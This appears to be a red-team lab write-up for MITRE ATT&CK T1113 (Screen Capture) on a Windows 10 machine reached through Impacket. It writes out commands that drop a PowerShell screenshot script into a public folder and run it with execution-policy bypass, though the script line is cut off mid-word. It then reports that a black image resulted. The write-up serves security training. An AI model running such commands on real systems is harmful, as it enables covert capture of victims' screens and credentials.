# T1113 - Screen Capture

## Description
This technique involves capturing the desktop screen of a compromised Windows system. Attackers use screen capture to collect sensitive visual information such as open documents, credentials, or internal tools.

**MITRE ATT&CK Technique:** [T1113 - Screen Capture](https://attack.mitre.org/techniques/T1113/)

---

## Lab Environment

- **Attacker Machine:** Kali Linux (`192.168.10.250`)
- **Target Machine:** Windows 10 Workstation (`192.168.10.9`)
- **Domain:** ADPRO
- **Access Method:** Impacket PsExec / Wmiexec
- **Objective:** Capture a screenshot of the target desktop

---

## Execution Steps

### 1. Create Screenshot Script on Target

cmd
mkdir C:\Users\Public\Documents\Logs

powershell -Command "Set-Content -Path C:\Users\Public\Documents\Logs\screen.ps1 -Value 'Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $b = New-Object Drawing.Bitma

2. Execute the Script

powershell -ExecutionPolicy Bypass -File C:\Users\Public\Documents\Logs\screen.ps1

Results Status: Partially Successful. Successfully created and executed a PowerShell screen capture script on the target.
A screenshot file (screenshot.png) was generated.
The resulting image was black due to limitations of running in a non-interactive session (Session 0) via Impacket.

